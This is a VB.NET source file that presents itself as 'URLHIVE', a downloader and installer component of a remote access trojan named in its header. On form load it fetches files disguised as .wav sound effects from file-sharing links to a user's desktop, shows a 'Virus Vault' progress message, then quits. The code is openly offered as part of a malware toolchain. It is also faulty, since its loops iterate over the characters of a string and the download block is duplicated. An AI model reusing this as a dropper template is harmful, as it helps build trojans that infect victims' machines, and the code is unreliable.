'Project Name: "URLHIVE" :: Application Type: Multiple URL Downloader | Zip Compression/Decompression Tool | Installer (Child Process of TaraMax_The-RAT "Dark Crystal Hybrid RAT")
'Project Location: Black Star Research Facility: Ukraine
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Net
Imports System.Threading
Imports System.Windows.Forms

Namespace URLHIVE
    Public Partial Class Form1
        Inherits Form

        Private ReadOnly stopwatch As Stopwatch = New Stopwatch()

        Private ReadOnly url As String = "https://od.lk/d/MTRfMjYwNzk3ODBf/Bell2SFX.wav" & "C:\Users\" & Environment.UserName


        Public Sub New()
            InitializeComponent()
        End Sub

        Private Sub Form1_Load(sender As Object, e As EventArgs)
            Call Application.EnableVisualStyles()

            For Each item In url

                Dim webClient As WebClient = New WebClient()
                AddHandler webClient.DownloadFileCompleted, New AsyncCompletedEventHandler(AddressOf Completed)
                AddHandler webClient.DownloadProgressChanged, New DownloadProgressChangedEventHandler(AddressOf ProgressChanged)
                'ADD URL'S TO DOWNLOAD USING ASYNC
                webClient.DownloadFileAsync(New Uri("https://od.lk/d/MTRfMjYwNzk3Njdf/b1.wav"), "C:\Users\rytho\OneDrive - University of Maine System\Desktop\Bell2SFX.wav")

                ' string startPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                'string zipPath = @"c:\example\result.zip";
                'string extractPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                'string unzip = @"C:\Users\" + Environment.UserName + @"\Desktop\your_app.txt";
                ' ZipFile.CreateFromDirectory(startPath, zipPath);
                'ZipFile.ExtractToDirectory(startPath, unzip);

            Next

            For Each item In url

                Dim webClient As WebClient = New WebClient()
                AddHandler webClient.DownloadFileCompleted, New AsyncCompletedEventHandler(AddressOf Completed)
                AddHandler webClient.DownloadProgressChanged, New DownloadProgressChangedEventHandler(AddressOf ProgressChanged)
                'ADD URL'S TO DOWNLOAD USING ASYNC
                webClient.DownloadFileAsync(New Uri("https://od.lk/d/MTRfMjYwNzk3ODJf/Boom1SFX.wav"), "C:\Users\rytho\OneDrive - University of Maine System\Desktop\Boom1SFX.wav")

                ' string startPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                'string zipPath = @"c:\example\result.zip";
                'string extractPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                'string unzip = @"C:\Users\" + Environment.UserName + @"\Desktop\your_app.txt";
                ' ZipFile.CreateFromDirectory(startPath, zipPath);
                ' ZipFile.ExtractToDirectory(startPath, unzip);

            Next

            For Each item In url

                Dim webClient As WebClient = New WebClient()
                AddHandler webClient.DownloadFileCompleted, New AsyncCompletedEventHandler(AddressOf Completed)
                AddHandler webClient.DownloadProgressChanged, New DownloadProgressChangedEventHandler(AddressOf ProgressChanged)
                'ADD URL'S TO DOWNLOAD USING ASYNC
                webClient.DownloadFileAsync(New Uri("https://od.lk/d/MTRfMjYwNzk4MDVf/DarkPassageSFX.wav"), "C:\Users\rytho\OneDrive - University of Maine System\Desktop\DarkPassageSFX.wav")

                ' string startPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                'string zipPath = @"c:\example\result.zip";
                'string extractPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                'string unzip = @"C:\Users\" + Environment.UserName + @"\Desktop\your_app.txt";
                ' ZipFile.CreateFromDirectory(startPath, zipPath);
                ' ZipFile.ExtractToDirectory(startPath, unzip);

            Next

        End Sub

        Private Sub ProgressChanged(sender As Object, e As DownloadProgressChangedEventArgs)
            Try
                ' Calculate progress values
                Dim downloadProgress As String = e.ProgressPercentage.ToString() & "% WARNING..."

                Dim downloadSpeed = String.Format("{0} MB/s", (e.BytesReceived / 1024.0 / 1024.0 / stopwatch.Elapsed.TotalSeconds).ToString("0.00"))

                Dim downloadedMBs As String = Math.Round(e.BytesReceived / 1024.0 / 1024.0).ToString() & " MB"

                Dim totalMBs As String = Math.Round(e.TotalBytesToReceive / 1024.0 / 1024.0).ToString() & " MB"

                label1.Text = downloadProgress.ToString()
                ' Format progress string
                Dim progress = $"{downloadedMBs}/{totalMBs} ({downloadProgress}) @ {downloadSpeed}" ' 10 MB / 100 MB (10%) @ 1.23 MB/s

                HOSTBYTES.SelectedIndex = HOSTBYTES.Items.Count - 1

                HOSTBYTES.SelectedIndex = -1

                HOSTBYTES.Items.Add(progress & downloadedMBs & downloadProgress & totalMBs & downloadSpeed)

                progressBar1.Increment(1)

                label2.Text = progressBar1.Value.ToString() & "% Downloading Mother's Virus Vault...."

                progressBar1.Value = e.ProgressPercentage
            Catch __unusedException1__ As Exception
                ' Debug.WriteLine("Error");
            End Try
            If progressBar1.Value >= 100 Then

                progressBar1.Value = progressBar1.Value
                Thread.Sleep(500)
                Call Application.ExitThread()
            End If

        End Sub

        Private Sub Completed(sender As Object, e As AsyncCompletedEventArgs)
            Debug.WriteLine("Download completed!")
        End Sub

    End Class
End Namespace
